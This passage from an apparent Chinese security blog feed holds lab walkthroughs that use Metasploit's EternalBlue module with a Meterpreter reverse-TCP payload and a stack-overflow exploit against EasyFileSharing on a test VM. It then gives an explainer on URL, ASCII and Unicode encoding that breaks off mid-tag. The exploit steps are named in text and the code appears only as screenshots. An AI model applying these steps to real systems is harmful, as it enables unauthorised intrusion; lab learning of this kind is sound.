开启msf<br>
<img src="https://7usai.github.io/post-images/1600589833942.png" alt="" loading="lazy"></p>
<p>寻找攻击模块</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600589837383.png" alt="" loading="lazy"></figure>
<p>调用模块use exploit/windows/smb/ms17_010_eternalblue</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600589841598.png" alt="" loading="lazy"></figure>
<p>show payloads后选windows/x64/meterpreter/reverse_tcp</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600589845319.png" alt="" loading="lazy"></figure>
<p>开始攻击</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600589849159.png" alt="" loading="lazy"></figure>
<p>成功获得shell</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用msf利用easyfilesharing漏洞]]></title>
        <id>https://7usai.github.io/post/1ucQSUb1Y/</id>
        <link href="https://7usai.github.io/post/1ucQSUb1Y/">
        </link>
        <updated>2020-09-20T03:46:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="思路">思路</h3>
<p>1.安装一个win10虚拟机<br>
2.开启win10虚拟机端口<br>
3.开始攻击</p>
<p>win10ip地址</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600573646446.png" alt="" loading="lazy"></figure>
<p>查看开启端口</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600573658331.png" alt="" loading="lazy"></figure>
<p>这里可以看到80端口为easyfilesharing，因为在win10虚拟机里我们设置的就为80</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600573677088.png" alt="" loading="lazy"></figure>
<p>搜索EasyFileSharing漏洞</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600573690601.png" alt="" loading="lazy"></figure>
<p>设置攻击模块</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600573704435.png" alt="" loading="lazy"></figure>
<p>show payloads后选择第52个</p>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1600573712860.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1600573771977.png" alt="" loading="lazy"></figure>
<p>在这里可以看到缺少一个RHOSTS和一个LHOST，RHOSTS为靶机IP（win10虚拟机），LHOSTS为攻击者IP（kali）</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1600573785155.png" alt="" loading="lazy"></figure>
<p>查看kali ip地址</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1600573798152.png" alt="" loading="lazy"></figure>
<p>设置ip地址</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1600573806372.png" alt="" loading="lazy"></figure>
<p>此漏洞失败</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1600573816668.png" alt="" loading="lazy"></figure>
<h3 id="尝试栈溢出漏洞">尝试栈溢出漏洞</h3>
<p>首先我们查看easyfilesharing上存在哪些漏洞</p>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1600573827540.png" alt="" loading="lazy"></figure>
<p>我们选取这个进行栈溢出漏洞攻击</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1600573834729.png" alt="" loading="lazy"></figure>
<p>利用漏洞脚本</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1600573841739.png" alt="" loading="lazy"></figure>
<p>打开了计算器并且关闭了easyfilesharing</p>
<p><img src="https://7usai.github.io/post-images/1600573847447.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600573853001.png" alt="" loading="lazy"></p>
<h3 id="漏洞利用成功">漏洞利用成功</h3>
<p>利用溢出漏洞攻击目标并让其服务崩溃和让主机运行计算器</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[URL,ASCII,Unicode,Base64]]></title>
        <id>https://7usai.github.io/post/BNdT9mz74/</id>
        <link href="https://7usai.github.io/post/BNdT9mz74/">
        </link>
        <updated>2020-09-19T11:13:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="url编码">URL编码</h3>
<p>URI所允许的字符分作<strong>保留</strong>与<strong>未保留</strong>。<strong>保留</strong>字符是那些具有特殊含义的字符，例如：<a href="https://zh.wikipedia.org/wiki/%E6%96%9C%E7%B7%9A">斜线</a>字符用于URL（或URI）不同部分的分界符；<strong>未保留</strong>字符没有这些特殊含义。百分号编码把保留字符表示为特殊字符序列。上述情形随URI与URI的不同版本规格会有轻微的变化。</p>
<h4 id="对保留字符的百分号编码">对保留字符的百分号编码</h4>
<p>首先需要把该字符的ASCII的值表示为两个16进制的数字，然后在其前面放置<a href="https://zh.wikipedia.org/wiki/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">转义字符</a>(&quot;<code>%</code>&quot;)，置入URI中的相应位置。</p>
<h4 id="对未保留字符的百分号编码">对未保留字符的百分号编码</h4>
<p>未保留字符不需要百分号编码.</p>
<h4 id="对百分号字符的百分号编码">对百分号字符的百分号编码</h4>
<p>由于百分号字符(&quot;%&quot;)表示百分号编码字节流的存在, 因此百分号字符应该被编码为3个字节的序列：&quot;%25&quot;，用于URI内部(0x25为%的ascii码)</p>
<p>编码表可以简单的以ASCII码表为准(见下)</p>
<p><a href="https://zh.wikipedia.org/wiki/%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81">URL编码_wiki百科</a></p>
<h2 id="ascii编码">ASCII编码</h2>
<p>ASCII 由电报码发展而来，经过多次更新至今为止共定义了128个字符；其中33个字符无法显示（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等8-bit符号），且这33个字符多数都已是陈废的<a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E5%85%83">控制字符</a>。控制字符的用途主要是用来操控已经处理过的文字。<br>
可以简单的分为控制字符和可显示字符</p>
<p>用十进制来表示的话，0<sub>31+127位为控制字符，32</sub>126为可显示字符，其中48～57为0到9十个阿拉伯数字。65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等</p>
<p><a href="https://zh.wikipedia.org/wiki/ASCII">ASCII_wiki百科</a></p>
<h2 id="unicode码">Unicode码</h2>
<p><a href="https://baike.baidu.com/item/Unicode">Unicode</a>是一个编码方案，Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a>编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。</p>
<p>Unicode码扩展自ASCII<a href="https://baike.baidu.com/item/%E5%AD%97%E5%85%83%E9%9B%86">字元集</a>。Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能用於电脑通讯的字元、象形文字和其他符号。</p>
<p>Unicode最初打算作为ASCII的补充，可能的话，最终将代替它。</p>
<p>Unicode码一直在修正扩充，目前已经包含的文字有：<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E6%8B%89%E4%BC%AF%E5%AD%97%E6%AF%8D">阿拉伯字母</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E7%BE%8E%E5%B0%BC%E4%BA%9E%E5%AD%97%E6%AF%8D">亚美尼亚字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AD%9F%E5%8A%A0%E6%8B%89%E6%96%87">孟加拉文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%A8%E9%9F%B3%E7%AC%A6%E8%99%9F">注音符号</a>、<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%87%8C%E7%88%BE%E5%AD%97%E6%AF%8D">西里尔字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%A9%E5%9F%8E%E6%96%87">天城文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E9%B2%81%E5%90%89%E4%BA%9A%E5%AD%97%E6%AF%8D">格鲁吉亚字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E8%87%98%E5%AD%97%E6%AF%8D">希腊字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%90%89%E6%8B%89%E7%89%B9%E6%96%87">古吉拉特文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E6%9C%A8%E5%9F%BA%E6%96%87">古木基文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AB%BA%E6%96%87">谚文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E4%BC%AF%E4%BE%86%E5%AD%97%E6%AF%8D">希伯来字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E5%81%87%E5%90%8D">平假名</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E7%B4%8D%E9%81%94%E6%96%87">卡纳达文</a>、<a href="https://zh.wikipedia.org/wiki/%E7%89%87%E5%81%87%E5%90%8D">片假名</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AF%AE%E6%96%87%E5%AD%97">寮文字</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8B%89%E4%B8%81%E5%AD%97%E6%AF%8D">拉丁字母</a>、<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E6%8B%89%E9%9B%85%E6%8B%89%E5%A7%86%E6%96%87">马拉雅拉姆文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%A7%E9%87%8C%E4%BA%9E%E6%96%87">奥里亚文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E7%B1%B3%E7%88%BE%E6%96%87">泰米尔文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E5%8D%A2%E5%9B%BA%E6%96%87">泰卢固文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E6%96%87%E5%AD%97">泰文字</a>、<a href="https://zh.wikipedia.org/wiki/%E6%AD%90%E5%85%83%E7%AC%A6%E8%99%9F">欧元符号</a>、对象替换字符、<a href="https://zh.wikipedia.org/wiki/%E5%88%87%E7%BD%97%E5%9F%BA%E6%96%87">切罗基文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%90%89%E8%8C%B2%E5%AD%97%E6%AF%8D">吉兹字母</a>，<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%A3%89%E5%AD%97%E6%AF%8D">高棉字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%92%99%E5%8F%A4%E5%AD%97%E6%AF%8D">蒙古字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BC%85%E6%96%87">缅文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%AD%90%E7%94%98%E5%AD%97%E6%AF%8D">欧甘字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%A2%E6%81%A9%E5%AD%97%E6%AF%8D">卢恩字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%83%A7%E4%BC%BD%E7%BE%85%E6%96%87">僧伽罗文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%95%98%E5%88%A9%E4%BA%9E%E5%AD%97%E6%AF%8D">叙利亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%AE%83%E6%8B%BF%E5%AD%97%E6%AF%8D">它拿字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E6%8B%BF%E5%A4%A7%E5%8E%9F%E4%BD%8F%E6%B0%91%E9%9F%B3%E7%AF%80%E6%96%87%E5%AD%97">加拿大原住民音节文字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BD%9D%E6%96%87">彝文</a><br>
、部分盲文图案、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BE%B7%E7%91%9F%E9%9B%B7%E7%89%B9%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">德瑟雷特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%93%A5%E7%89%B9%E5%AD%97%E6%AF%8D">哥特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E6%84%8F%E5%A4%A7%E5%88%A9%E5%AD%97%E6%AF%8D">古意大利字母</a>、<a href="https://zh.wikipedia.org/wiki/%E9%9F%B3%E6%A8%82%E7%AC%A6%E8%99%9F">音乐符号</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E9%9F%B3%E4%B9%90%E7%AC%A6%E5%8F%B7">拜占庭音乐符号</a>，<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%97%A5%E9%9F%A9%E7%BB%9F%E4%B8%80%E8%A1%A8%E6%84%8F%E6%96%87%E5%AD%97">中日韩统一表意文字</a>、<a href="https://zh.wikipedia.org/wiki/%E8%8F%B2%E5%BE%8B%E5%AE%BE">菲律宾</a>文字<a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E9%94%A1%E6%96%87">布锡文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%93%88%E5%8A%AA%E8%AF%BA%E6%96%87&amp;action=edit&amp;redlink=1">哈努诺文</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BB%96%E5%8A%A0%E7%A5%BF%E6%96%87">他加禄文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A1%94%E6%A0%BC%E5%B7%B4%E5%A5%B4%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">塔格巴奴亚文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A1%9E%E6%B5%A6%E8%B7%AF%E6%96%AF%E9%9F%B3%E8%8A%82%E6%96%87%E5%AD%97">塞浦路斯音节文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9E%97%E5%B8%83%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">林布字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E5%BD%A2%E6%96%87%E5%AD%97B">线形文字B</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A5%A7%E6%96%AF%E6%9B%BC%E4%BA%9E%E5%AD%97%E6%AF%8D">奥斯曼亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%95%AD%E4%BC%AF%E7%B4%8D%E5%AD%97%E6%AF%8D">萧伯纳字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%BE%B7%E5%AE%8F%E5%82%A3%E6%96%87">德宏傣文</a>，<a href="https://zh.wikipedia.org/wiki/%E4%B9%8C%E5%8A%A0%E9%87%8C%E7%89%B9%E5%AD%97%E6%AF%8D">乌加里特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6">六十四卦</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%83%E5%90%89%E6%96%87&amp;action=edit&amp;redlink=1">布吉文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E6%8B%89%E5%93%A5%E9%87%8C%E5%AD%97%E6%AF%8D">格拉哥里字母</a>，<a href="https://zh.wikipedia.org/wiki/%E4%BD%89%E5%8D%A2%E6%96%87">佉卢文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%8F%8C%E7%89%88%E7%BA%B3%E5%82%A3%E6%96%87">西双版纳傣文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E6%B3%A2%E6%96%AF%E6%96%87&amp;action=edit&amp;redlink=1">古波斯文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%94%A1%E5%B0%94%E8%B5%AB%E7%89%B9%E6%96%87&amp;action=edit&amp;redlink=1">锡尔赫特文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8F%90%E9%9D%9E%E7%B4%8D%E6%96%87">提非纳文</a> 、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E5%B8%8C%E8%85%8A%E9%9F%B3%E4%B9%90%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">古希腊音乐符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E5%8E%98%E6%96%87">巴厘文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%A5%94%E5%BD%A2%E6%96%87%E5%AD%97">楔形文字</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%9D%9E%E4%B9%A6%E9%9D%A2%E6%96%87%E5%AD%97">西非书面文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%85%AB%E6%80%9D%E5%B7%B4%E6%96%87">八思巴文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%85%93%E5%B0%BC%E5%9F%BA%E5%AD%97%E6%AF%8D">腓尼基字母</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%A1%E5%88%A9%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">卡利亚文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%A0%E5%A9%86%E5%AD%97%E6%AF%8D">占婆字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%85%8B%E8%80%B6%E9%BB%8E%E6%96%87&amp;action=edit&amp;redlink=1">克耶黎文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BB%92%E5%B7%B4%E6%96%87">绒巴文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%88%A9%E8%A5%BF%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">利西亚文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%90%95%E5%BA%95%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">吕底亚文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A1%91%E5%A1%94%E5%88%A9%E6%96%87&amp;action=edit&amp;redlink=1">桑塔利文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%8B%89%E8%AE%A9%E6%96%87&amp;action=edit&amp;redlink=1">拉让文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%B4%A2%E6%8B%89%E4%BB%80%E7%89%B9%E6%8B%89%E6%96%87&amp;action=edit&amp;redlink=1">索拉什特拉文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%BD%E4%BB%96%E6%96%87&amp;action=edit&amp;redlink=1">巽他文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E7%93%A6%E4%BC%8A%E6%96%87&amp;action=edit&amp;redlink=1">瓦伊文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%96%90%E6%96%AF%E6%89%98%E6%96%AF%E5%9C%93%E7%9B%A4">斐斯托斯圆盘</a>，<a href="https://zh.wikipedia.org/wiki/%E9%BA%BB%E5%B0%86">麻将</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%B1%B3%E8%AF%BA%E9%AA%A8%E7%89%8C">多米诺骨牌</a>上的符号、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%98%BF%E7%BB%B4%E6%96%AF%E9%99%80%E6%96%87&amp;action=edit&amp;redlink=1">阿维斯陀文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E5%A7%86%E7%A9%86%E6%96%87%E5%AD%97">巴姆穆文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%9F%83%E5%8F%8A%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97">埃及象形文字</a> （<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E6%B1%80%E7%B4%8D%E7%AC%A6%E8%99%9F%E8%A1%A8">加汀纳符号表</a>，涵盖1071个符号），<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E6%8B%89%E5%A7%86%E6%96%87">亚拉姆文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E6%8B%89%E7%BB%B4%E7%A2%91%E9%93%AD%E4%BD%93&amp;action=edit&amp;redlink=1">巴拉维碑铭体</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%95%E6%8F%90%E4%BA%9A%E7%A2%91%E9%93%AD%E4%BD%93&amp;action=edit&amp;redlink=1">帕提亚碑铭体</a>，<a href="https://zh.wikipedia.org/wiki/%E7%88%AA%E5%93%87%E6%96%87">爪哇文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%87%B1%E6%8F%90%E6%96%87">凯提文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E5%82%88%E5%83%B3%E6%96%87">老傈僳文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9B%BC%E5%B0%BC%E6%99%AE%E5%B0%94%E6%96%87&amp;action=edit&amp;redlink=1">曼尼普尔文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%97%E9%98%BF%E6%8B%89%E4%BC%AF%E5%AD%97%E6%AF%8D">南阿拉伯字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E7%AA%81%E5%8E%A5%E6%96%87">古突厥文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%92%92%E7%8E%9B%E5%88%A9%E4%BA%9A%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">撒玛利亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E5%82%A3%E6%96%87">老傣文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%82%A3%E9%BB%AF%E8%AA%9E">傣越文</a>。、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E5%A1%94%E5%85%8B%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">巴塔克字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A9%86%E7%BD%97%E7%B1%B3%E6%96%87%E5%AD%97">婆罗米文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9B%BC%E8%BE%BE%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">曼达字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%B8%E7%89%8C">纸牌</a>符号，<a href="https://zh.wikipedia.org/wiki/%E4%BA%A4%E9%80%9A%E6%A0%87%E5%BF%97">交通标志</a>，<a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%9B%BE">地图</a>符号，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%82%BC%E9%87%91%E6%9C%AF%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">炼金术符号</a>，<a href="https://zh.wikipedia.org/wiki/%E9%A2%9C%E6%96%87%E5%AD%97">颜文字</a>、<a href="https://zh.wikipedia.org/wiki/%E7%BB%98%E6%96%87%E5%AD%97">绘文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9F%A5%E5%85%8B%E9%A9%AC%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">查克马字母</a>，<a href="https://zh.wikipedia.org/wiki/%E9%BA%A6%E7%BD%97%E5%9F%83%E6%96%87">麦罗埃文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%BA%A6%E7%BD%97%E5%9F%83%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">麦罗埃象形文字</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9F%8F%E6%A0%BC%E7%90%86%E8%8B%97%E6%96%87">柏格理苗文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A4%8F%E6%8B%89%E9%81%94%E6%96%87">夏拉达文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E6%8B%89%E5%83%A7%E5%B9%B3%E6%96%87%E5%AD%97">索拉僧平文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B3%B0%E5%85%8B%E9%87%8C%E6%96%87&amp;action=edit&amp;redlink=1">泰克里文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9C%9F%E8%80%B3%E5%85%B6%E9%87%8C%E6%8B%89%E7%AC%A6%E5%8F%B7">土耳其里拉符号</a>、5个双向排版符号、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E8%90%A8%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">巴萨字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%AB%98%E5%8A%A0%E7%B4%A2%E9%98%BF%E5%B0%94%E5%B7%B4%E5%B0%BC%E4%BA%9A%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">高加索阿尔巴尼亚字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9D%9C%E6%99%AE%E9%9B%B7%E5%9A%B4%E9%80%9F%E8%A8%98&amp;action=edit&amp;redlink=1">杜普雷严速记</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%88%B1%E5%B0%94%E5%B7%B4%E6%A1%91%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">爱尔巴桑字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%85%B0%E5%A1%94%E6%96%87">古兰塔文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%AF%E5%90%89%E6%96%87&amp;action=edit&amp;redlink=1">可吉文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BA%93%E8%BE%BE%E7%93%A6%E8%BF%AA%E6%96%87&amp;action=edit&amp;redlink=1">库达瓦迪文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E5%BD%A2%E6%96%87%E5%AD%97A">线形文字A</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%A9%AC%E5%93%88%E4%BD%B3%E5%B0%BC%E6%96%87&amp;action=edit&amp;redlink=1">马哈佳尼文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%BC%E6%95%99%E5%AD%97%E6%AF%8D">摩尼教字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%97%A8%E5%BE%97%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">门得文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%8E%AB%E8%BF%AA%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">莫迪字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%BB%98%E6%96%87&amp;action=edit&amp;redlink=1">默文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%B4%8D%E5%B7%B4%E6%B3%B0%E5%AD%97%E6%AF%8D">纳巴泰字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E5%8C%97%E9%98%BF%E6%8B%89%E4%BC%AF%E6%96%87&amp;action=edit&amp;redlink=1">古北阿拉伯文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%BD%BC%E7%88%BE%E5%A7%86%E6%96%87">古彼尔姆文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9D%A8%E6%9D%BE%E5%BD%95%E8%8B%97%E6%96%87">杨松录苗文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%95%E7%B1%B3%E6%8B%89%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">帕米拉文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%A2%8D%E6%B8%85%E8%B1%AA%E6%96%87&amp;action=edit&amp;redlink=1">袍清豪文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%AF%97%E7%AF%87%E5%B7%B4%E5%88%97%E7%BB%B4%E6%96%87&amp;action=edit&amp;redlink=1">诗篇巴列维文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%82%89%E6%9B%87%E6%96%87%E5%AD%97">悉昙文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%BA%95%E7%BD%97%E4%BB%86%E5%A4%9A%E6%96%87">底罗仆多文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%93%A6%E5%85%B0%E9%BD%90%E5%9C%B0%E6%96%87&amp;action=edit&amp;redlink=1">瓦兰齐地文</a>、<a href="https://zh.wikipedia.org/wiki/Dingbat">装饰符号</a>、<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E6%B4%AA%E5%A7%86%E6%96%87">阿洪姆文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%AE%89%E7%BA%B3%E6%89%98%E5%88%A9%E4%BA%9A%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">安纳托利亚象形文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%93%88%E5%9D%A6%E6%96%87&amp;action=edit&amp;redlink=1">哈坦文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%A9%86%E5%B0%94%E5%A1%94%E5%B0%BC%E6%96%87&amp;action=edit&amp;redlink=1">穆尔塔尼文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%8C%88%E7%89%99%E5%88%A9%E5%AD%97%E6%AF%8D">古匈牙利字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E4%B9%A6%E5%86%99%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">书写符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%88%87%E7%BD%97%E5%9F%BA%E6%96%87">切罗基文</a>小写字母，以及五种<a href="https://zh.wikipedia.org/wiki/%E7%BB%98%E6%96%87%E5%AD%97">绘文字</a><a href="https://zh.wikipedia.org/wiki/%E8%86%9A%E8%89%B2">肤色</a>修改字符、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%98%BF%E5%BE%B7%E6%8B%89%E5%A7%86%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">阿德拉姆字母</a>，<a 